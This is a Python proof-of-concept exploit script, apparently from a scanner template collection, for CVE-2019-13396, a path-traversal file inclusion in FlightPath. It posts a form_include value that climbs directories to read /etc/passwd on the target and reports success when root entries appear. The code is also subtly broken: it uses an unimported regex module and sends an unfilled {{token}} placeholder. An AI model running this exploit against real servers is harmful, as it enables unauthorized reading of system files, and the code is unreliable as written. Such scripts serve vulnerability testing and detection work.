import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''FlightPath Local File Inclusion''',
        "description": '''FlightPath versions prior to 4.8.2 and 5.0-rc2 suffer from a local file inclusion vulnerability.''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/47121", 
            "https://www.cvedetails.com/cve/CVE-2019-13396/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2019-13396"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2019-13396",
            "cwe-id": "CWE-22"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2019", "flightpath", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/login"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/flightpath/index.php?q=system-handle-form-submit"""
        method = "POST"
        data = """callback=system_login_form&form_token={{token}}&form_include=../../../../../../../../../etc/passwd"""
        headers = {'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url